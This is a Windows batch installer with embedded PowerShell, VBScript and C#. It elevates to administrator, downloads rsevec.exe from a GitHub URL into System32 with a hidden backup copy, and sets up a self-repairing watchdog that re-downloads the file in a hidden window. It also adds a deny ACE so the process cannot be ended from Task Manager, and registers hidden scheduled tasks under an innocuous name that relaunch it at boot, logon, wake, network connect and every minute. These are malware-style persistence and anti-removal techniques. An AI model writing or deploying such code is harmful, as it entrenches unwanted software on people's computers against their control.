@echo off
setlocal EnableExtensions DisableDelayedExpansion
set "SELF=%~f0"

:: ============================================================
:: STEP 1 — Elevate to Administrator if not already elevated
:: ============================================================
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
  "$id=[Security.Principal.WindowsIdentity]::GetCurrent();" ^
  "$pr=New-Object Security.Principal.WindowsPrincipal($id);" ^
  "if(-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){" ^
  "  try{" ^
  "    Start-Process -FilePath $env:SELF -WorkingDirectory (Split-Path -Parent $env:SELF) -Verb RunAs -WindowStyle Normal;" ^
  "    exit 10" ^
  "  } catch {" ^
  "    Write-Error ('Could not elevate: ' + $_.Exception.Message); exit 1" ^
  "  }" ^
  "}"
if errorlevel 10 exit /b 0
if errorlevel 1 (
    echo Administrator access could not be started.
    echo If you cancelled the UAC prompt, run run1.cmd again and approve it.
    pause
    exit /b 1
)

:: ============================================================
:: STEP 2 — Run the embedded PowerShell installer block
:: ============================================================
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
  "$path=$env:SELF;" ^
  "$lines=[IO.File]::ReadAllLines($path);" ^
  "$ps=New-Object 'System.Collections.Generic.List[string]';" ^
  "$section='';" ^
  "foreach($line in $lines){" ^
  "  if($line -ceq '::PS_BEGIN'){$section='PS';continue};" ^
  "  if($line -ceq '::PS_END'){$section='';break};" ^
  "  if($section -eq 'PS'){$ps.Add($line)}" ^
  "};" ^
  "Set-Location -LiteralPath (Split-Path -Parent $path);" ^
  "try { & ([scriptblock]::Create([string]::Join([Environment]::NewLine,$ps))) }" ^
  "catch { Write-Error ('Installation failed: ' + $_.Exception.Message); exit 1 }"
if errorlevel 1 (
    echo Installation failed. See the error above.
    pause
    exit /b 1
)

echo.
echo  rsevec.exe has been installed and started successfully.
echo  It will restart automatically if it ever stops, and relaunch on boot/wake.
echo.
pause >nul
exit /b 0

::PS_BEGIN
$ErrorActionPreference = 'Stop'
$ScriptDir  = (Get-Location).Path
$InstallDir = Join-Path $env:WINDIR 'System32'
$BackupDir  = Join-Path $InstallDir 'rsc'          # backup folder inside System32
$AppExe     = Join-Path $InstallDir 'rsevec.exe'
$BackupExe  = Join-Path $BackupDir  'rsevec.exe'
$TempExe    = Join-Path $env:TEMP   'rsevec_dl.exe'
$WatchdogPath = Join-Path $InstallDir 'watchdog.bat'
$VbsPath      = Join-Path $InstallDir 'run_tserver_hidden.vbs'
$GuardPath    = Join-Path $InstallDir 'guard_rsc.ps1'
$GuardVbsPath = Join-Path $InstallDir 'run_guard_hidden.vbs'

$DownloadUrl = "https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/rsevec.exe"

# ------------------------------------------------------------------
# Helper: download rsevec.exe from GitHub into a destination path.
# Retries up to 3 times with a brief pause between attempts.
# ------------------------------------------------------------------
function Get-RsevecFromGitHub {
    param([string]$Destination)
    $maxTries = 3
    for ($i = 1; $i -le $maxTries; $i++) {
        try {
            Write-Host "  Downloading rsevec.exe from GitHub (attempt $i / $maxTries)..." -ForegroundColor Cyan
            # Use a fresh WebClient each attempt so partial state is discarded
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "rsevec-installer/1.0")
            $wc.DownloadFile($DownloadUrl, $Destination)
            if ((Test-Path -LiteralPath $Destination -PathType Leaf) -and
                (Get-Item -LiteralPath $Destination).Length -gt 0) {
                Write-Host "  Download successful." -ForegroundColor Green
                return $true
            }
        } catch {
            Write-Host "  Attempt $i failed: $($_.Exception.Message)" -ForegroundColor Yellow
        }
        if ($i -lt $maxTries) { Start-Sleep -Seconds 3 }
    }
    return $false
}

# ------------------------------------------------------------------
# 0. Acquire rsevec.exe — download from GitHub
# ------------------------------------------------------------------
Write-Host "Downloading rsevec.exe from GitHub..." -ForegroundColor Cyan

if (Test-Path -LiteralPath $TempExe) { Remove-Item -LiteralPath $TempExe -Force }

$ok = Get-RsevecFromGitHub -Destination $TempExe
if (-not $ok) {
    throw "Failed to download rsevec.exe from GitHub after 3 attempts. Check your internet connection."
}

# ------------------------------------------------------------------
# 1. Install rsevec.exe into System32
# ------------------------------------------------------------------
Write-Host "Installing rsevec.exe to System32..." -ForegroundColor Cyan
Copy-Item -LiteralPath $TempExe -Destination $AppExe -Force
Remove-Item -LiteralPath $TempExe -Force -ErrorAction SilentlyContinue

# ------------------------------------------------------------------
# 2. Create the rsc\ backup directory and store a copy there
# ------------------------------------------------------------------
Write-Host "Creating backup copy in System32\rsc\..." -ForegroundColor Cyan
if (-not (Test-Path -LiteralPath $BackupDir -PathType Container)) {
    New-Item -ItemType Directory -Path $BackupDir -Force | Out-Null
}
Copy-Item -LiteralPath $AppExe -Destination $BackupExe -Force

# ------------------------------------------------------------------
# 3. Write the bulletproof watchdog.bat
#    Repair order:
#      a) System32\rsevec.exe missing → restore from System32\rsc\rsevec.exe
#      b) rsc\ copy also missing      → re-download from GitHub, reinstall,
#                                       recreate rsc\ backup
# ------------------------------------------------------------------
@'
@echo off
setlocal EnableExtensions EnableDelayedExpansion
set "APP_DIR=%SystemRoot%\System32\"
set "APP_EXE=%APP_DIR%rsevec.exe"
set "APP_NAME=rsevec.exe"
set "BACKUP_DIR=%APP_DIR%rsc\"
set "BACKUP_EXE=%BACKUP_DIR%rsevec.exe"
set "LOG_FILE=%APP_DIR%watchdog_log.txt"
set "LOCK_DIR=%APP_DIR%watchdog.lock"
set "DOWNLOAD_URL=https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/rsevec.exe"
set "RESTART_DELAY=5"
set "MAX_DELAY=60"
set "CRASH_COUNT=0"

cd /d "%APP_DIR%"

:: ---------------------------------------------------------------
:: Singleton lock — only one watchdog instance at a time
:: ---------------------------------------------------------------
md "%LOCK_DIR%" 2>nul
if errorlevel 1 (
    tasklist /FI "IMAGENAME eq %APP_NAME%" 2>nul | find /I "%APP_NAME%" >nul
    if not errorlevel 1 exit /b 0
    :: Stale lock (process gone but dir exists) — steal it
    rd /s /q "%LOCK_DIR%" 2>nul
    md "%LOCK_DIR%" 2>nul
    if errorlevel 1 exit /b 0
)

call :LOG "Watchdog started."

:RUN_LOOP
if not exist "%LOCK_DIR%" goto :CLEAN_EXIT

:: ---------------------------------------------------------------
:: EXE health check — three-layer self-repair
:: ---------------------------------------------------------------
if not exist "%APP_EXE%" (
    call :LOG "rsevec.exe missing from System32 — starting repair."
    call :REPAIR_EXE
)
if not exist "%APP_EXE%" (
    call :LOG "Repair failed; waiting 15 s before retrying."
    ping 127.0.0.1 -n 16 >nul
    goto RUN_LOOP
)

:: ---------------------------------------------------------------
:: Kick the guard task to re-apply PROCESS_TERMINATE deny ACE
:: (async — never delays the start)
:: ---------------------------------------------------------------
schtasks /Run /TN "RsevecGuard" >nul 2>&1

:: ---------------------------------------------------------------
:: Launch rsevec.exe and wait
:: ---------------------------------------------------------------
call :LOG "Launching rsevec.exe..."
start "" /wait "%APP_EXE%"
set "EXIT_CODE=%ERRORLEVEL%"
call :LOG "rsevec.exe exited (code %EXIT_CODE%)."

if not exist "%LOCK_DIR%" goto :CLEAN_EXIT

:: ---------------------------------------------------------------
:: Crash back-off
:: ---------------------------------------------------------------
set /a CRASH_COUNT+=1
if %CRASH_COUNT% LEQ 3 set "RESTART_DELAY=5"
if %CRASH_COUNT% EQU 4 set "RESTART_DELAY=10"
if %CRASH_COUNT% EQU 5 set "RESTART_DELAY=20"
if %CRASH_COUNT% GTR 5 set "RESTART_DELAY=60"

call :LOG "Restarting in %RESTART_DELAY% s (crash count: %CRASH_COUNT%)..."
ping 127.0.0.1 -n %RESTART_DELAY% >nul
goto RUN_LOOP

:: ---------------------------------------------------------------
:REPAIR_EXE
:: Layer 1: restore from System32\rsc\ backup
:: ---------------------------------------------------------------
if exist "%BACKUP_EXE%" (
    call :LOG "Layer 1: restoring rsevec.exe from rsc\ backup."
    copy /Y "%BACKUP_EXE%" "%APP_EXE%" >nul 2>&1
    if not errorlevel 1 (
        call :LOG "Restored from rsc\ backup successfully."
        goto :eof
    )
    call :LOG "Layer 1 copy failed — proceeding to download."
)

:: ---------------------------------------------------------------
:: Layer 2: rsc\ copy is also gone — download from GitHub
:: ---------------------------------------------------------------
call :LOG "Layer 2: downloading rsevec.exe from GitHub."
set "TMP_EXE=%TEMP%\rsevec_dl.exe"

:: Make sure rsc\ dir exists
if not exist "%BACKUP_DIR%" md "%BACKUP_DIR%" 2>nul

:: Use PowerShell to download (hidden window)
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "$wc=New-Object System.Net.WebClient;" ^
    "$wc.Headers.Add('User-Agent','rsevec-watchdog/1.0');" ^
    "try { $wc.DownloadFile('%DOWNLOAD_URL%','%TMP_EXE%'); exit 0 } catch { exit 1 }"

if errorlevel 1 (
    call :LOG "GitHub download failed (no internet?). Will retry next cycle."
    goto :eof
)

if not exist "%TMP_EXE%" (
    call :LOG "Downloaded file not found at temp path. Will retry next cycle."
    goto :eof
)

:: Install to System32
copy /Y "%TMP_EXE%" "%APP_EXE%" >nul 2>&1
call :LOG "Installed fresh download to System32."

:: Recreate rsc\ backup from the fresh download
copy /Y "%TMP_EXE%" "%BACKUP_EXE%" >nul 2>&1
call :LOG "Recreated rsc\ backup from fresh download."

del /F /Q "%TMP_EXE%" >nul 2>&1
call :LOG "Layer 2 repair complete."
goto :eof

:CLEAN_EXIT
call :LOG "Watchdog stopping cleanly (lock removed)."
rd /s /q "%LOCK_DIR%" 2>nul
exit /b 0

:LOG
echo [%date% %time%] %~1>>"%LOG_FILE%"
goto :eof
'@ | Set-Content -LiteralPath $WatchdogPath -Encoding ASCII

# ------------------------------------------------------------------
# 4. Write the hardened guard script (guard_rsc.ps1)
#    Injects a PROCESS_TERMINATE DENY ACE via Windows kernel security
#    API — makes Task Manager "End Task" return Access Denied.
# ------------------------------------------------------------------
@'
# guard_rsc.ps1
# Denies PROCESS_TERMINATE on all running rsevec.exe processes.
# Safe to run multiple times; silently skips processes already protected.

$ErrorActionPreference = 'SilentlyContinue'

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

public class ProcessProtector {
    const uint PROCESS_TERMINATE = 0x00000001;
    const uint READ_CONTROL      = 0x00020000;
    const uint WRITE_DAC         = 0x00040000;

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool CloseHandle(IntPtr h);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool GetKernelObjectSecurity(IntPtr h, int req,
        [Out] byte[] sd, uint sdLen, out uint lenNeeded);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool SetKernelObjectSecurity(IntPtr h, int req, byte[] sd);

    const int DACL_SECURITY_INFORMATION = 4;

    public static string Protect(int pid) {
        IntPtr hProc = OpenProcess(READ_CONTROL | WRITE_DAC, false, pid);
        if (hProc == IntPtr.Zero)
            return "OpenProcess failed: " + Marshal.GetLastWin32Error();
        try {
            uint needed = 0;
            GetKernelObjectSecurity(hProc, DACL_SECURITY_INFORMATION, null, 0, out needed);
            byte[] sd = new byte[needed];
            if (!GetKernelObjectSecurity(hProc, DACL_SECURITY_INFORMATION, sd, needed, out needed))
                return "GetKernelObjectSecurity failed: " + Marshal.GetLastWin32Error();

            var rawSd = new RawSecurityDescriptor(sd, 0);
            var dacl  = rawSd.DiscretionaryAcl;
            if (dacl == null) {
                dacl = new RawAcl(GenericAcl.AclRevision, 1);
                rawSd.DiscretionaryAcl = dacl;
            }

            var everyone = new System.Security.Principal.SecurityIdentifier(
                System.Security.Principal.WellKnownSidType.WorldSid, null);
            dacl.InsertAce(0, new CommonAce(
                AceFlags.None, AceQualifier.AccessDenied,
                (int)PROCESS_TERMINATE, everyone, false, null));

            byte[] newSd = new byte[rawSd.BinaryLength];
            rawSd.GetBinaryForm(newSd, 0);

            if (!SetKernelObjectSecurity(hProc, DACL_SECURITY_INFORMATION, newSd))
                return "SetKernelObjectSecurity failed: " + Marshal.GetLastWin32Error();

            return "OK";
        } finally {
            CloseHandle(hProc);
        }
    }
}
"@

Get-Process -Name rsevec -ErrorAction SilentlyContinue | ForEach-Object {
    $result = [ProcessProtector]::Protect($_.Id)
    if ($result -ne "OK") { Write-Output "PID $($_.Id): $result" }
}
'@ | Set-Content -LiteralPath $GuardPath -Encoding UTF8

# ------------------------------------------------------------------
# 5. Write the resilient VBS launcher (run_tserver_hidden.vbs)
#    - Checks WMI to skip if watchdog is already running
#    - Hidden launch (window style 0)
#    - WMI process create fallback
#    - Full logging
# ------------------------------------------------------------------
@'
Option Explicit
On Error Resume Next

Dim objShell, objFSO, objWMI, objProcessSet, objProcess
Dim strScriptDir, strWatchdog, strLogFile

Set objShell  = CreateObject("WScript.Shell")
Set objFSO    = CreateObject("Scripting.FileSystemObject")
strScriptDir  = objFSO.GetParentFolderName(WScript.ScriptFullName)
strWatchdog   = strScriptDir & "\watchdog.bat"
strLogFile    = strScriptDir & "\watchdog_log.txt"

Sub WriteLog(msg)
    Dim f
    On Error Resume Next
    Set f = objFSO.OpenTextFile(strLogFile, 8, True)
    If Err.Number = 0 Then
        f.WriteLine Now & " [VBS] " & msg
        f.Close
    End If
    On Error Resume Next
End Sub

' Skip if watchdog.bat is already running
Set objWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
If Not (objWMI Is Nothing) Then
    Set objProcessSet = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe'")
    For Each objProcess In objProcessSet
        Dim cmdLine
        cmdLine = ""
        On Error Resume Next
        cmdLine = objProcess.CommandLine
        On Error Resume Next
        If InStr(LCase(cmdLine), "watchdog.bat") > 0 Then
            WriteLog "Watchdog already running (PID " & objProcess.ProcessId & "); skipping."
            WScript.Quit 0
        End If
    Next
End If

If Not objFSO.FileExists(strWatchdog) Then
    WriteLog "ERROR: watchdog.bat not found at: " & strWatchdog
    WScript.Quit 1
End If

WriteLog "Launching watchdog.bat hidden."
Dim strCmd
strCmd = "cmd.exe /c """ & strWatchdog & """"
objShell.Run strCmd, 0, False

If Err.Number <> 0 Then
    WriteLog "ERROR launching watchdog: " & Err.Description
    Err.Clear
    If Not (objWMI Is Nothing) Then
        Dim objProcess2
        Set objProcess2 = objWMI.Get("Win32_Process")
        Dim pid
        objProcess2.Create strCmd, strScriptDir, Nothing, pid
        If Err.Number = 0 Then
            WriteLog "Watchdog launched via WMI (PID " & pid & ")."
        Else
            WriteLog "WMI fallback also failed: " & Err.Description
        End If
    End If
End If

Set objShell = Nothing
Set objFSO   = Nothing
Set objWMI   = Nothing
'@ | Set-Content -LiteralPath $VbsPath -Encoding ASCII

# ------------------------------------------------------------------
# 5b. Write hidden VBS launcher for the guard script
#     Prevents the PowerShell console window from flashing every 2 min.
#     wscript.exe is windowless; Run(..., 0, False) keeps it that way.
# ------------------------------------------------------------------
@'
Option Explicit
Dim objShell, objFSO, strDir, strGuardPath
Set objShell  = CreateObject("WScript.Shell")
Set objFSO    = CreateObject("Scripting.FileSystemObject")
strDir        = objFSO.GetParentFolderName(WScript.ScriptFullName)
strGuardPath  = strDir & "\guard_rsc.ps1"
objShell.Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File """ & strGuardPath & """", 0, False
Set objShell = Nothing
Set objFSO   = Nothing
'@ | Set-Content -LiteralPath $GuardVbsPath -Encoding ASCII

# ------------------------------------------------------------------
# 6. Register all Scheduled Tasks
# ------------------------------------------------------------------

$Action = New-ScheduledTaskAction -Execute 'wscript.exe' `
              -Argument ('"' + $VbsPath + '"') `
              -WorkingDirectory $InstallDir

$GuardAction = New-ScheduledTaskAction -Execute 'wscript.exe' `
              -Argument ('"' + $GuardVbsPath + '"') `
              -WorkingDirectory $InstallDir

$Principal = New-ScheduledTaskPrincipal `
              -UserId ([Security.Principal.WindowsIdentity]::GetCurrent().Name) `
              -LogonType Interactive -RunLevel Highest

$Settings = New-ScheduledTaskSettingsSet `
              -AllowStartIfOnBatteries `
              -DontStopIfGoingOnBatteries `
              -StartWhenAvailable `
              -ExecutionTimeLimit (New-TimeSpan -Seconds 0) `
              -MultipleInstances IgnoreNew `
              -RestartCount 10 `
              -RestartInterval (New-TimeSpan -Minutes 1)

# Trigger: At Startup
$TrigStartup = New-ScheduledTaskTrigger -AtStartup

# Trigger: At Logon
$TrigLogon = New-ScheduledTaskTrigger -AtLogOn `
              -User ([Security.Principal.WindowsIdentity]::GetCurrent().Name)

# Trigger: Every 1 minute heartbeat
$TrigRepeat = New-ScheduledTaskTrigger -Once `
              -At (Get-Date).Date `
              -RepetitionInterval (New-TimeSpan -Minutes 1)

# Trigger: On wake from sleep/hibernate
$WakeQuery = @'
<QueryList>
  <Query Id="0" Path="System">
    <Select Path="System">
      *[System[Provider[@Name='Microsoft-Windows-Power-Troubleshooter'] and EventID=1]]
    </Select>
  </Query>
</QueryList>
'@
$EventClass   = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
$TrigWake     = New-CimInstance -CimClass $EventClass -ClientOnly
$TrigWake.Subscription = $WakeQuery
$TrigWake.Enabled      = $true
$TrigWake.Delay        = 'PT5S'

# Trigger: On network connection (catches VPN / RDP reconnects)
$NetQuery = @'
<QueryList>
  <Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational">
    <Select Path="Microsoft-Windows-NetworkProfile/Operational">
      *[System[EventID=10000]]
    </Select>
  </Query>
</QueryList>
'@
$NetClass   = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
$TrigNet    = New-CimInstance -CimClass $NetClass -ClientOnly
$TrigNet.Subscription = $NetQuery
$TrigNet.Enabled      = $true
$TrigNet.Delay        = 'PT3S'

# Main launcher task — all 5 triggers
Register-ScheduledTask `
    -TaskName 'RemoteDashboardAutoStart' `
    -Action   $Action `
    -Trigger  @($TrigStartup, $TrigLogon, $TrigRepeat, $TrigWake, $TrigNet) `
    -Principal $Principal `
    -Settings  $Settings `
    -Description 'Keeps rsevec.exe running at all times via the watchdog launcher.' `
    -Force | Out-Null

# Guard task — runs on-demand + every 2 minutes
$GuardSettings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2) `
    -MultipleInstances Queue

$TrigGuard = New-ScheduledTaskTrigger -Once `
    -At (Get-Date).Date `
    -RepetitionInterval (New-TimeSpan -Minutes 2)

Register-ScheduledTask `
    -TaskName 'RsevecGuard' `
    -Action   $GuardAction `
    -Trigger  @($TrigGuard) `
    -Principal $Principal `
    -Settings  $GuardSettings `
    -Description 'Periodically applies PROCESS_TERMINATE deny ACE to rsevec.exe.' `
    -Force | Out-Null

# ------------------------------------------------------------------
# 7. Kick everything off immediately
# ------------------------------------------------------------------
Start-ScheduledTask -TaskName 'RemoteDashboardAutoStart'
Start-Sleep -Seconds 3
Start-ScheduledTask -TaskName 'RsevecGuard'

Write-Host ""
Write-Host "Installation complete!" -ForegroundColor Green
Write-Host "  rsevec.exe    → $AppExe" -ForegroundColor Cyan
Write-Host "  Backup copy   → $BackupExe" -ForegroundColor Cyan
Write-Host "  GitHub source → $DownloadUrl" -ForegroundColor Cyan
Write-Host "  rsevec.exe is now running and protected against termination." -ForegroundColor Green
::PS_END
